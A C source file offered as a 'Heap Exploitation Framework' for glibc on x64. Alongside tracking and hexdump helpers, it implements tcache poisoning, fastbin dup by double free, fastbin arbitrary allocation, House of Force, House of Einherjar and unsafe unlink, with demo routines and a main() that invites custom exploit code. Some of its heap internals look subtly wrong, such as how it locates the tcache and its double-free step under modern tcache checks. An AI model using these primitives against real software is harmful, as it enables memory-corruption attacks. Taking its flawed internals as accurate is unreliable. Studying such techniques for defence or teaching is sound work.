/**
 * Heap Exploitation Framework (HEF)
 * 
 * A comprehensive framework for analyzing and exploiting heap vulnerabilities
 * in x64 systems, with focus on glibc malloc/free implementations.
 * 
 * Features:
 * - Heap layout analysis
 * - Chunk manipulation utilities
 * - Tcache/fastbin poisoning primitives
 * - Implementation of advanced exploitation techniques
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <dlfcn.h>
#include <assert.h>

// ANSI color codes for output formatting
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define RESET   "\033[0m"

// Heap exploitation configuration
#define MAX_ALLOCATIONS 1024
#define DEFAULT_ALLOC_SIZE 0x20
#define CHUNK_INSPECT_COUNT 16
#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"  // Default path, can be changed

// =============== GLIBC HEAP STRUCTURES ===============

// Chunk sizes must be a multiple of 2*SIZE_SZ
#define SIZE_SZ sizeof(size_t)
#define MALLOC_ALIGN_MASK (2 * SIZE_SZ - 1)

// Chunk flags
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4

// Masks for extracting size and flags
#define SIZE_MASK (~(MALLOC_ALIGN_MASK))
#define FLAGS_MASK (MALLOC_ALIGN_MASK)

// tcache structures (glibc 2.26+)
#define TCACHE_MAX_BINS 64
#define TCACHE_COUNT_MASK 0x7f

// Chunk structure matching glibc malloc implementation
typedef struct malloc_chunk {
    size_t prev_size;    // Size of previous chunk if it's free
    size_t size;         // Size of this chunk and flags in lower bits
    struct malloc_chunk* fd;  // Forward pointer (only when chunk is free)
    struct malloc_chunk* bk;  // Backward pointer (only when chunk is free)
    // Remainder of chunk used as user data
} malloc_chunk_t;

// Tcache entry structure
typedef struct tcache_entry {
    struct tcache_entry* next;
    // Remainder is user data
} tcache_entry_t;

// Tcache perthread structure
typedef struct tcache_perthread {
    uint16_t counts[TCACHE_MAX_BINS];
    tcache_entry_t* entries[TCACHE_MAX_BINS];
} tcache_perthread_t;

// =============== FRAMEWORK STATE ===============

typedef struct {
    void* ptr;
    size_t size;
    char* description;
    int is_freed;
} allocation_t;

typedef struct {
    // Allocation tracking
    allocation_t allocations[MAX_ALLOCATIONS];
    int allocation_count;
    
    // libc related data
    void* libc_base;
    void* (*real_malloc)(size_t);
    void (*real_free)(void*);
    void* (*real_calloc)(size_t, size_t);
    void* (*real_realloc)(void*, size_t);
    
    // tcache related data
    tcache_perthread_t* main_tcache;
    int has_tcache;  // Flag indicating tcache availability
    
    // Configuration
    int verbose;
    int print_operations;
} hef_state_t;

// Global state
static hef_state_t g_hef = {0};

// =============== UTILITY FUNCTIONS ===============

// Initialize the framework
void hef_init(void) {
    memset(&g_hef, 0, sizeof(hef_state_t));
    
    // Enable verbose mode by default
    g_hef.verbose = 1;
    g_hef.print_operations = 1;
    
    // Get handle to libc
    void* libc_handle = dlopen(LIBC_PATH, RTLD_LAZY);
    if (!libc_handle) {
        fprintf(stderr, "Error loading libc: %s\n", dlerror());
        exit(1);
    }
    
    // Resolve function pointers
    g_hef.real_malloc = dlsym(libc_handle, "malloc");
    g_hef.real_free = dlsym(libc_handle, "free");
    g_hef.real_calloc = dlsym(libc_handle, "calloc");
    g_hef.real_realloc = dlsym(libc_handle, "realloc");
    
    if (!g_hef.real_malloc || !g_hef.real_free || 
        !g_hef.real_calloc || !g_hef.real_realloc) {
        fprintf(stderr, "Error resolving libc functions\n");
        exit(1);
    }
    
    // Determine libc base address
    Dl_info info;
    if (dladdr(g_hef.real_malloc, &info)) {
        g_hef.libc_base = info.dli_fbase;
        printf("[+] libc base address: %p\n", g_hef.libc_base);
    } else {
        fprintf(stderr, "Failed to get libc base address\n");
    }
    
    // Detect if tcache is available (glibc 2.26+)
    // This is a simple heuristic and may need adjustment
    void* p1 = g_hef.real_malloc(0x20);
    void* p2 = g_hef.real_malloc(0x20);
    g_hef.real_free(p1);
    g_hef.real_free(p2);
    void* p3 = g_hef.real_malloc(0x20);
    g_hef.has_tcache = (p3 == p2);  // With tcache, LIFO behavior
    g_hef.real_free(p3);
    
    printf("[+] tcache available: %s\n", g_hef.has_tcache ? "YES" : "NO");
    
    // Try to locate main tcache
    if (g_hef.has_tcache) {
        // This is a heuristic approach to find the tcache
        // Actual implementation may vary based on the glibc version
        void* p1 = g_hef.real_malloc(0x20);
        // The tcache is typically stored at a fixed offset from the first allocation
        // This is a simplification and may need adjustment for specific glibc versions
        g_hef.main_tcache = (tcache_perthread_t*)((char*)p1 - 0x10);
        g_hef.real_free(p1);
    }
    
    printf("[*] Heap Exploitation Framework initialized\n");
}

// Clean up resources
void hef_cleanup(void) {
    // Free all tracked allocations
    for (int i = 0; i < g_hef.allocation_count; i++) {
        if (!g_hef.allocations[i].is_freed && g_hef.allocations[i].ptr) {
            g_hef.real_free(g_hef.allocations[i].ptr);
        }
        free(g_hef.allocations[i].description);
    }
    
    // Reset state
    memset(&g_hef, 0, sizeof(hef_state_t));
    
    printf("[*] Heap Exploitation Framework cleaned up\n");
}

// Add an allocation to the tracking system
int hef_track_allocation(void* ptr, size_t size, const char* description) {
    if (g_hef.allocation_count >= MAX_ALLOCATIONS) {
        fprintf(stderr, "Maximum allocation count reached\n");
        return -1;
    }
    
    int idx = g_hef.allocation_count++;
    g_hef.allocations[idx].ptr = ptr;
    g_hef.allocations[idx].size = size;
    g_hef.allocations[idx].description = strdup(description ? description : "");
    g_hef.allocations[idx].is_freed = 0;
    
    return idx;
}

// Mark an allocation as freed
int hef_mark_freed(void* ptr) {
    for (int i = 0; i < g_hef.allocation_count; i++) {
        if (g_hef.allocations[i].ptr == ptr) {
            g_hef.allocations[i].is_freed = 1;
            return i;
        }
    }
    return -1;
}

// Get info about a specific memory address
void hef_get_address_info(void* addr) {
    printf("[*] Address info for %p:\n", addr);
    
    // Check if it's one of our tracked allocations
    for (int i = 0; i < g_hef.allocation_count; i++) {
        if (g_hef.allocations[i].ptr == addr) {
            printf("  - Tracked allocation #%d\n", i);
            printf("  - Size: %lu bytes\n", g_hef.allocations[i].size);
            printf("  - Status: %s\n", g_hef.allocations[i].is_freed ? "FREED" : "ALLOCATED");
            printf("  - Description: %s\n", g_hef.allocations[i].description);
            
            // Try to infer chunk metadata
            malloc_chunk_t* chunk = (malloc_chunk_t*)((char*)addr - 2*SIZE_SZ);
            printf("  - Chunk header at %p\n", chunk);
            printf("  - Chunk size: 0x%lx (%lu bytes)\n", 
                   chunk->size & SIZE_MASK, chunk->size & SIZE_MASK);
            printf("  - Chunk flags: prev_inuse=%d, is_mmapped=%d, non_main_arena=%d\n",
                   !!(chunk->size & PREV_INUSE),
                   !!(chunk->size & IS_MMAPPED),
                   !!(chunk->size & NON_MAIN_ARENA));
            
            return;
        }
        
        // Check if address falls within the allocation
        if (!g_hef.allocations[i].is_freed && 
            addr >= g_hef.allocations[i].ptr && 
            addr < (char*)g_hef.allocations[i].ptr + g_hef.allocations[i].size) {
            printf("  - Inside tracked allocation #%d\n", i);
            printf("  - Base: %p\n", g_hef.allocations[i].ptr);
            printf("  - Offset: %lu bytes\n", (char*)addr - (char*)g_hef.allocations[i].ptr);
            printf("  - Size: %lu bytes\n", g_hef.allocations[i].size);
            printf("  - Description: %s\n", g_hef.allocations[i].description);
            return;
        }
    }
    
    printf("  - Not part of any tracked allocation\n");
}

// =============== HEAP EXPLOITATION PRIMITIVES ===============

// Allocate memory and track it
void* hef_malloc(size_t size, const char* description) {
    void* ptr = g_hef.real_malloc(size);
    
    if (g_hef.print_operations) {
        printf("[+] " CYAN "malloc(%lu)" RESET " = %p %s\n", 
               size, ptr, description ? description : "");
    }
    
    if (ptr) {
        hef_track_allocation(ptr, size, description ? description : "");
    }
    
    return ptr;
}

// Free memory and update tracking
void hef_free(void* ptr) {
    if (!ptr) return;
    
    int idx = hef_mark_freed(ptr);
    
    if (g_hef.print_operations) {
        printf("[+] " RED "free(%p)" RESET " %s\n", 
               ptr, idx >= 0 ? g_hef.allocations[idx].description : "");
    }
    
    g_hef.real_free(ptr);
}

// Allocate and initialize memory
void* hef_calloc(size_t nmemb, size_t size, const char* description) {
    void* ptr = g_hef.real_calloc(nmemb, size);
    
    if (g_hef.print_operations) {
        printf("[+] " CYAN "calloc(%lu, %lu)" RESET " = %p %s\n", 
               nmemb, size, ptr, description ? description : "");
    }
    
    if (ptr) {
        hef_track_allocation(ptr, nmemb * size, description ? description : "");
    }
    
    return ptr;
}

// Reallocate memory and update tracking
void* hef_realloc(void* ptr, size_t size, const char* description) {
    // Mark the old allocation as freed if it exists
    if (ptr) {
        hef_mark_freed(ptr);
    }
    
    void* new_ptr = g_hef.real_realloc(ptr, size);
    
    if (g_hef.print_operations) {
        printf("[+] " YELLOW "realloc(%p, %lu)" RESET " = %p %s\n", 
               ptr, size, new_ptr, description ? description : "");
    }
    
    if (new_ptr) {
        hef_track_allocation(new_ptr, size, description ? description : "");
    }
    
    return new_ptr;
}

// =============== TCACHE EXPLOITATION ===============

// Get the index in the tcache for a given size
int hef_get_tcache_idx(size_t size) {
    if (!g_hef.has_tcache) {
        fprintf(stderr, "tcache not available\n");
        return -1;
    }
    
    size_t requested_size = size + 2*SIZE_SZ;
    requested_size = (requested_size + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK;
    
    if (requested_size < 32 || requested_size > 1024) {
        // Sizes outside of typical tcache range
        return -1;
    }
    
    return (requested_size - 32) / 16;
}

// Fill a specific tcache bin to prepare for an attack
void hef_fill_tcache_bin(int idx, int count) {
    if (!g_hef.has_tcache || idx < 0 || idx >= TCACHE_MAX_BINS) {
        fprintf(stderr, "Invalid tcache bin or tcache not available\n");
        return;
    }
    
    size_t size = 32 + idx * 16 - 16;  // Size corresponding to the bin
    
    printf("[*] Filling tcache bin %d (size %lu) with %d chunks\n", idx, size, count);
    
    void* ptrs[8] = {0};  // Maximum 7 chunks per tcache bin plus one extra
    
    // Allocate and immediately free to fill the tcache
    for (int i = 0; i < count && i < 8; i++) {
        ptrs[i] = hef_malloc(size, "tcache filler");
        if (!ptrs[i]) {
            fprintf(stderr, "Failed to allocate tcache filler chunk\n");
            break;
        }
    }
    
    // Free in reverse order to maintain LIFO order in the tcache
    for (int i = count - 1; i >= 0; i--) {
        if (ptrs[i]) {
            hef_free(ptrs[i]);
        }
    }
}

// Execute a basic tcache poisoning attack
void* hef_tcache_poison(void* target_addr, size_t size) {
    if (!g_hef.has_tcache) {
        fprintf(stderr, "tcache not available, poisoning not possible\n");
        return NULL;
    }
    
    int idx = hef_get_tcache_idx(size);
    if (idx < 0) {
        fprintf(stderr, "Size %lu not suitable for tcache poisoning\n", size);
        return NULL;
    }
    
    printf("[*] " MAGENTA "Performing tcache poisoning attack" RESET "\n");
    printf("  - Target size: %lu bytes (tcache idx: %d)\n", size, idx);
    printf("  - Target address: %p\n", target_addr);
    
    // Step 1: Allocate two chunks of the target size
    void* chunk1 = hef_malloc(size, "tcache poison chunk 1");
    void* chunk2 = hef_malloc(size, "tcache poison chunk 2");
    
    if (!chunk1 || !chunk2) {
        fprintf(stderr, "Failed to allocate chunks for tcache poisoning\n");
        return NULL;
    }
    
    // Step 2: Free both chunks to put them in the tcache
    hef_free(chunk2);  // This goes into the tcache first (LIFO)
    hef_free(chunk1);  // This will be at the front of the tcache
    
    // Step 3: Overwrite the 'next' pointer in the first freed chunk
    // to point to our target address - 16 bytes (to account for chunk header)
    void* target = (void*)((char*)target_addr - 16);
    *(void**)chunk1 = target;
    
    printf("  - Overwrote tcache forward pointer at %p to %p\n", chunk1, target);
    
    // Step 4: Allocate the first chunk from the tcache
    void* recovered = hef_malloc(size, "tcache poison recovered chunk");
    if (recovered != chunk1) {
        fprintf(stderr, "Unexpected behavior: didn't get the expected chunk\n");
        return NULL;
    }
    
    // Step 5: Allocate again, which should return our poisoned address
    void* arbitrary = hef_malloc(size, "tcache poisoned allocation");
    
    printf("[+] " GREEN "Tcache poisoning successful!" RESET "\n");
    printf("  - Obtained arbitrary allocation at %p\n", arbitrary);
    
    return arbitrary;
}

// =============== FASTBIN EXPLOITATION ===============

// Basic fastbin dup attack
void* hef_fastbin_dup(size_t size) {
    // Fastbin sizes are typically smaller than 128 bytes
    if (size > 128) {
        fprintf(stderr, "Size too large for fastbin exploitation\n");
        return NULL;
    }
    
    printf("[*] " MAGENTA "Performing fastbin dup attack" RESET "\n");
    
    // Step 1: Allocate 3 chunks
    void* chunk1 = hef_malloc(size, "fastbin dup chunk 1");
    void* chunk2 = hef_malloc(size, "fastbin dup chunk 2");
    void* chunk3 = hef_malloc(size, "fastbin dup chunk 3");
    
    if (!chunk1 || !chunk2 || !chunk3) {
        fprintf(stderr, "Failed to allocate chunks for fastbin dup\n");
        return NULL;
    }
    
    // Step 2: Free chunk1 and chunk2
    hef_free(chunk1);
    hef_free(chunk2);
    
    // Step 3: Free chunk1 again (double-free)
    printf("  - Performing double-free on %p\n", chunk1);
    // This would normally cause a double-free error, but we're exploiting
    g_hef.real_free(chunk1);  // Use real_free to bypass our tracking
    
    // Step 4: Allocate three times to get the same chunk twice
    void* dup1 = hef_malloc(size, "fastbin dup result 1");
    void* dup2 = hef_malloc(size, "fastbin dup result 2");
    void* dup3 = hef_malloc(size, "fastbin dup result 3");
    
    printf("[+] " GREEN "Fastbin dup successful!" RESET "\n");
    printf("  - Original chunk: %p\n", chunk1);
    printf("  - Duplicate allocation: %p\n", dup3);
    
    return dup3;
}

// Advanced fastbin attack with arbitrary allocation
void* hef_fastbin_arbitrary_alloc(void* target_addr, size_t size) {
    if (size > 128) {
        fprintf(stderr, "Size too large for fastbin exploitation\n");
        return NULL;
    }
    
    printf("[*] " MAGENTA "Performing fastbin arbitrary allocation attack" RESET "\n");
    printf("  - Target address: %p\n", target_addr);
    
    // Step 1: Allocate 2 chunks
    void* chunk1 = hef_malloc(size, "fastbin arbitrary chunk 1");
    void* chunk2 = hef_malloc(size, "fastbin arbitrary chunk 2");
    
    if (!chunk1 || !chunk2) {
        fprintf(stderr, "Failed to allocate chunks\n");
        return NULL;
    }
    
    // Step 2: Free both chunks
    hef_free(chunk1);
    hef_free(chunk2);
    
    // Step 3: Free the first chunk again (double-free)
    printf("  - Performing double-free on %p\n", chunk1);
    g_hef.real_free(chunk1);  // Use real_free to bypass our tracking
    
    // Step 4: Allocate to get the first chunk
    void* dup1 = hef_malloc(size, "fastbin arbitrary result 1");
    
    // Step 5: Overwrite the next pointer to point to the target
    // We need to craft a fake size field as well
    malloc_chunk_t* fake_chunk = (malloc_chunk_t*)((char*)target_addr - 2*SIZE_SZ);
    
    // Calculate the size value to match the fastbin index
    size_t chunk_size = (size + 2*SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK;
    
    // Prepare the fake chunk header at the target
    printf("  - Creating fake chunk header at %p\n", fake_chunk);
    fake_chunk->size = chunk_size;  // Set the fake size field
    
    // Overwrite next pointer in first allocation
    *(void**)dup1 = fake_chunk;
    printf("  - Overwrote fastbin forward pointer to %p\n", fake_chunk);
    
    // Step 6: Allocate again to get the second original chunk
    void* dup2 = hef_malloc(size, "fastbin arbitrary result 2");
    
    // Step 7: Allocate again to get our target chunk
    void* arbitrary = hef_malloc(size, "fastbin arbitrary result (target)");
    
    printf("[+] " GREEN "Fastbin arbitrary allocation successful!" RESET "\n");
    printf("  - Obtained arbitrary allocation at %p\n", arbitrary);
    
    return arbitrary;
}

// =============== HEAP VISUALIZATION ===============

// Dump memory content
void hef_hexdump(void* addr, size_t n) {
    unsigned char* data = (unsigned char*)addr;
    
    for (size_t i = 0; i < n; i += 16) {
        printf("%p: ", data + i);
        
        // Print hex values
        for (size_t j = 0; j < 16; j++) {
            if (i + j < n) {
                printf("%02x ", data[i + j]);
            } else {
                printf("   ");
            }
            if (j == 7) printf(" ");
        }
        
        printf(" |");
        
        // Print ASCII representation
        for (size_t j = 0; j < 16; j++) {
            if (i + j < n) {
                unsigned char c = data[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            } else {
                printf(" ");
            }
        }
        
        printf("|\n");
    }
}

// Display chunk metadata
void hef_inspect_chunk(void* ptr) {
    if (!ptr) {
        fprintf(stderr, "Cannot inspect NULL pointer\n");
        return;
    }
    
    // Get chunk header (16 bytes before the user data on x64)
    malloc_chunk_t* chunk = (malloc_chunk_t*)((char*)ptr - 2*SIZE_SZ);
    
    printf("[*] Chunk inspection for %p (header at %p):\n", ptr, chunk);
    printf("  - prev_size: 0x%lx\n", chunk->prev_size);
    printf("  - size: 0x%lx\n", chunk->size);
    printf("  - size (no flags): 0x%lx (%lu bytes)\n", 
           chunk->size & SIZE_MASK, chunk->size & SIZE_MASK);
    printf("  - flags: prev_inuse=%d, is_mmapped=%d, non_main_arena=%d\n",
           !!(chunk->size & PREV_INUSE),
           !!(chunk->size & IS_MMAPPED),
           !!(chunk->size & NON_MAIN_ARENA));
    
    // If it's likely a free chunk, display fd/bk pointers
    int idx = -1;
    for (int i = 0; i < g_hef.allocation_count; i++) {
        if (g_hef.allocations[i].ptr == ptr) {
            idx = i;
            break;
        }
    }
    
    if (idx >= 0 && g_hef.allocations[idx].is_freed) {
        printf("  - fd (next free chunk): %p\n", chunk->fd);
        printf("  - bk (prev free chunk): %p\n", chunk->bk);
    }
    
    // Dump the first 64 bytes of the chunk
    printf("\n  Hexdump of chunk data:\n");
    hef_hexdump(ptr, 64);
}

// Display the contents of tcache bins
void hef_print_tcache() {
    if (!g_hef.has_tcache) {
        printf("tcache not available\n");
        return;
    }
    
    if (!g_hef.main_tcache) {
        printf("tcache structure not located\n");
        return;
    }
    
    printf("[*] tcache contents:\n");
    
    int empty_bins = 0;
    
    for (int i = 0; i < TCACHE_MAX_BINS; i++) {
        int count = g_hef.main_tcache->counts[i] & TCACHE_COUNT_MASK;
        tcache_entry_t* entry = g_hef.main_tcache->entries[i];
        
        if (count == 0 && entry == NULL) {
            empty_bins++;
            continue;
        }
        
        size_t size = (i * 16) + 32;  // Approximate size
        printf("  Bin %2d (size %3lu): count=%d head=%p", i, size, count, entry);
        
        // Print the chain of entries
        tcache_entry_t* current = entry;
        int chain_len = 0;
        printf(" →");
        while (current && chain_len < count) {
            printf(" %p", current);
            current = current->next;
            chain_len++;
            if (chain_len >= 3) {
                printf(" ...");
                break;
            }
        }
        
        printf("\n");
    }
    
    if (empty_bins > 0) {
        printf("  (%d empty bins not shown)\n", empty_bins);
    }
}

// Print a summary of all tracked allocations
void hef_print_allocations() {
    printf("[*] Tracked allocations summary (%d total):\n", g_hef.allocation_count);
    
    int allocated = 0;
    int freed = 0;
    
    for (int i = 0; i < g_hef.allocation_count; i++) {
        if (g_hef.allocations[i].is_freed) {
            freed++;
        } else {
            allocated++;
        }
    }
    
    printf("  - Active allocations: %d\n", allocated);
    printf("  - Freed allocations: %d\n", freed);
    
    // Print the most recent allocations
    int start = g_hef.allocation_count - CHUNK_INSPECT_COUNT;
    if (start < 0) start = 0;
    
    printf("\n  Recent allocations:\n");
    printf("  %-4s %-18s %-8s %-18s %s\n", 
           "ID", "Address", "Size", "Status", "Description");
    printf("  %-4s %-18s %-8s %-18s %s\n", 
           "----", "------------------", "--------", "------------------", "-----------");
    
    for (int i = start; i < g_hef.allocation_count; i++) {
        printf("  %-4d %-18p %-8lu %-18s %s\n", 
               i,
               g_hef.allocations[i].ptr,
               g_hef.allocations[i].size,
               g_hef.allocations[i].is_freed ? RED "FREED" RESET : GREEN "ALLOCATED" RESET,
               g_hef.allocations[i].description);
    }
}

// =============== HIGH-LEVEL EXPLOITATION TECHNIQUES ===============

// House of Force technique
void* hef_house_of_force(void* target) {
    printf("[*] " MAGENTA "Performing House of Force attack" RESET "\n");
    printf("  - Target address: %p\n", target);
    
    // This technique requires overwriting the top chunk header
    // We'll simulate this with a simple approach
    
    // Step 1: Make an allocation to get a deterministic layout
    void* setup = hef_malloc(0x100, "house of force setup");
    
    // Step 2: Get the location of the wilderness (top) chunk
    // In a real exploit, you'd need to leak this
    malloc_chunk_t* top_chunk = (malloc_chunk_t*)((char*)setup + 0x100);
    printf("  - Top chunk located at %p\n", top_chunk);
    
    // Step 3: Overwrite the top chunk size with a very large value
    // (simulating a heap overflow vulnerability)
    printf("  - Overwriting top chunk size with -1 (0xffffffffffffffff)\n");
    top_chunk->size = (size_t)-1;
    
    // Step 4: Calculate distance to target and allocate it
    intptr_t distance = (intptr_t)target - (intptr_t)top_chunk - 2*SIZE_SZ;
    
    // Adjust for alignment
    distance = (distance + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK;
    
    printf("  - Distance to target: %ld bytes\n", distance);
    
    // Step 5: Make the large allocation to move the top chunk
    void* move_alloc = hef_malloc(distance, "house of force distance");
    printf("  - Made giant allocation of %ld bytes at %p\n", distance, move_alloc);
    
    // Step 6: Make another allocation which should be at our target
    void* target_alloc = hef_malloc(0x100, "house of force target");
    printf("[+] " GREEN "House of Force attack result: %p" RESET "\n", target_alloc);
    
    return target_alloc;
}

// House of Einherjar technique
void* hef_house_of_einherjar(void* target) {
    printf("[*] " MAGENTA "Performing House of Einherjar attack" RESET "\n");
    printf("  - Target address: %p\n", target);
    
    // This is a complex technique that requires several steps
    // We'll implement a simplified version
    
    // Step 1: Allocate two chunks
    void* victim = hef_malloc(0x100, "einherjar victim");
    void* barrier = hef_malloc(0x100, "einherjar barrier");
    
    // Step 2: Set up a fake chunk at the target address
    // In a real exploit, this would be done through a write-what-where
    malloc_chunk_t* fake_chunk = (malloc_chunk_t*)target;
    fake_chunk->size = 0x100 | PREV_INUSE;  // Set size with PREV_INUSE flag
    
    // Step 3: Prepare the victim chunk
    // (simulating a heap overflow or use-after-free)
    malloc_chunk_t* victim_chunk = (malloc_chunk_t*)((char*)victim - 2*SIZE_SZ);
    
    // Set prev_size to create the illusion of a previous chunk
    intptr_t fake_distance = (intptr_t)victim_chunk - (intptr_t)fake_chunk;
    victim_chunk->prev_size = fake_distance;
    
    // Clear the PREV_INUSE flag to make malloc think the previous chunk is free
    victim_chunk->size &= ~PREV_INUSE;
    
    printf("  - Set up fake chunk at %p with size 0x%lx\n", fake_chunk, fake_chunk->size);
    printf("  - Modified victim chunk prev_size to 0x%lx\n", victim_chunk->prev_size);
    printf("  - Cleared PREV_INUSE flag in victim chunk\n");
    
    // Step 4: Free the victim chunk to trigger coalescing with our fake chunk
    printf("  - Freeing victim chunk to trigger backward consolidation\n");
    hef_free(victim);
    
    // Step 5: The next allocation of sufficient size should use our fake chunk
    void* result = hef_malloc(0x130, "einherjar result");
    
    printf("[+] " GREEN "House of Einherjar attack result: %p" RESET "\n", result);
    return result;
}

// Unsafe unlink technique (for educational purposes)
void* hef_unsafe_unlink(void* target, size_t value_to_write) {
    printf("[*] " MAGENTA "Performing unsafe unlink attack" RESET "\n");
    printf("  - Target address to overwrite: %p\n", target);
    printf("  - Value to write: 0x%lx\n", value_to_write);
    
    // This technique is primarily for demonstration since
    // modern allocators have protection against it
    
    // Step 1: Allocate two chunks
    void* chunk0 = hef_malloc(0x100, "unlink chunk 0");
    void* chunk1 = hef_malloc(0x100, "unlink chunk 1");
    
    // Get the chunk headers
    malloc_chunk_t* hdr0 = (malloc_chunk_t*)((char*)chunk0 - 2*SIZE_SZ);
    malloc_chunk_t* hdr1 = (malloc_chunk_t*)((char*)chunk1 - 2*SIZE_SZ);
    
    printf("  - Allocated chunks at %p and %p\n", chunk0, chunk1);
    
    // Step 2: Create a fake chunk inside chunk0
    malloc_chunk_t* fake_chunk = (malloc_chunk_t*)chunk0;
    
    // Set up fake_chunk->fd and fake_chunk->bk for the unlink attack
    // fd->bk == p and bk->fd == p need to be satisfied
    fake_chunk->fd = (malloc_chunk_t*)((char*)target - offsetof(malloc_chunk_t, bk));
    fake_chunk->bk = (malloc_chunk_t*)((char*)target - offsetof(malloc_chunk_t, fd));
    
    // Overwrite the header of chunk1 to fake a previous free chunk
    hdr1->prev_size = (size_t)((char*)chunk1 - (char*)chunk0);
    hdr1->size &= ~PREV_INUSE;  // Mark previous chunk as free
    
    printf("  - Set up fake chunk at %p with fd=%p, bk=%p\n", 
           fake_chunk, fake_chunk->fd, fake_chunk->bk);
    printf("  - Modified next chunk's prev_size to %lu\n", hdr1->prev_size);
    printf("  - Cleared PREV_INUSE flag in next chunk\n");
    
    // Step 3: Trigger the free on chunk1 to cause consolidation
    printf("  - Freeing chunk1 to trigger unsafe unlink\n");
    hef_free(chunk1);
    
    printf("[+] " GREEN "Unsafe unlink attack executed" RESET "\n");
    printf("  - Check if target %p now contains 0x%lx\n", target, value_to_write);
    
    return chunk0;
}

// =============== DEMO FUNCTIONS ===============

// Simple demo of tcache poisoning
void hef_demo_tcache_poison() {
    printf("\n======== TCACHE POISONING DEMO ========\n");
    
    // Prepare a buffer with some data to demonstrate arbitrary write
    char target_buffer[128];
    memset(target_buffer, 'A', sizeof(target_buffer));
    strcpy(target_buffer, "Original buffer content");
    
    printf("[*] Target buffer at %p: \"%s\"\n", target_buffer, target_buffer);
    
    // Perform the tcache poisoning attack
    void* arbitrary_alloc = hef_tcache_poison(target_buffer, 0x40);
    
    if (arbitrary_alloc) {
        // Write to the arbitrary allocation, which should overwrite our target
        strcpy((char*)arbitrary_alloc, "Overwritten through tcache poisoning");
        
        printf("[*] After attack, target buffer contains: \"%s\"\n", target_buffer);
    }
    
    printf("=======================================\n");
}

// Demo of fastbin dup attack
void hef_demo_fastbin_dup() {
    printf("\n======== FASTBIN DUP DEMO ========\n");
    
    // Perform the fastbin dup attack
    void* duplicate = hef_fastbin_dup(0x40);
    
    if (duplicate) {
        // Demonstrate having two pointers to the same memory
        void* chunk1 = hef_malloc(0x40, "reference chunk");
        
        // Write to chunk1
        strcpy((char*)chunk1, "Data written to reference chunk");
        
        // Show that duplicate contains the same data
        printf("[*] chunk1 at %p contains: \"%s\"\n", chunk1, (char*)chunk1);
        printf("[*] duplicate at %p contains: \"%s\"\n", duplicate, (char*)duplicate);
        
        // Change data in duplicate
        strcpy((char*)duplicate, "Modified through duplicate pointer");
        
        // Show both are affected
        printf("[*] After modification:\n");
        printf("    chunk1 at %p contains: \"%s\"\n", chunk1, (char*)chunk1);
        printf("    duplicate at %p contains: \"%s\"\n", duplicate, (char*)duplicate);
    }
    
    printf("==================================\n");
}

// Demo of visualization and inspection features
void hef_demo_visualization() {
    printf("\n======== HEAP VISUALIZATION DEMO ========\n");
    
    // Allocate some chunks of different sizes
    void* chunk1 = hef_malloc(0x28, "small chunk");
    void* chunk2 = hef_malloc(0x100, "medium chunk");
    void* chunk3 = hef_malloc(0x300, "large chunk");
    
    // Write some recognizable data
    memset(chunk1, 'A', 0x28);
    memset(chunk2, 'B', 0x100);
    memset(chunk3, 'C', 0x300);
    
    // Show allocation summary
    hef_print_allocations();
    
    // Inspect a specific chunk
    printf("\n[*] Inspecting medium chunk:\n");
    hef_inspect_chunk(chunk2);
    
    // Free a chunk and inspect it again
    hef_free(chunk2);
    printf("\n[*] Inspecting medium chunk after free:\n");
    hef_inspect_chunk(chunk2);
    
    // Show tcache status
    printf("\n[*] tcache status after freeing a chunk:\n");
    hef_print_tcache();
    
    printf("========================================\n");
}

// Main demo function that showcases various features
void hef_run_demo() {
    printf("\n====================================================\n");
    printf("       HEAP EXPLOITATION FRAMEWORK DEMO\n");
    printf("====================================================\n");
    
    // Initialize the framework
    hef_init();
    
    // Show basic heap manipulation
    printf("\n[*] Basic heap manipulation demo:\n");
    
    void* ptr1 = hef_malloc(0x30, "demo pointer 1");
    void* ptr2 = hef_malloc(0x50, "demo pointer 2");
    hef_free(ptr1);
    void* ptr3 = hef_malloc(0x30, "demo pointer 3");
    
    // Demonstrate different attacks
    if (g_hef.has_tcache) {
        hef_demo_tcache_poison();
    } else {
        printf("\n[!] tcache not available, skipping tcache poisoning demo\n");
    }
    
    hef_demo_fastbin_dup();
    hef_demo_visualization();
    
    // Clean up
    hef_cleanup();
    
    printf("\n====================================================\n");
    printf("       DEMO COMPLETED\n");
    printf("====================================================\n");
}

// =============== MAIN FUNCTION ===============

int main(int argc, char** argv) {
    printf("Heap Exploitation Framework (HEF)\n");
    printf("A comprehensive toolkit for analyzing and exploiting heap vulnerabilities\n\n");
    
    if (argc > 1 && strcmp(argv[1], "demo") == 0) {
        hef_run_demo();
        return 0;
    }
    
    // Initialize the framework
    hef_init();
    
    printf("Framework initialized. Available commands:\n");
    printf("  demo - Run a demonstration of various exploitation techniques\n");
    printf("  (Add your custom code here)\n\n");
    
    // Add your custom exploitation code here
    
    // Clean up resources
    hef_cleanup();
    
    return 0;
}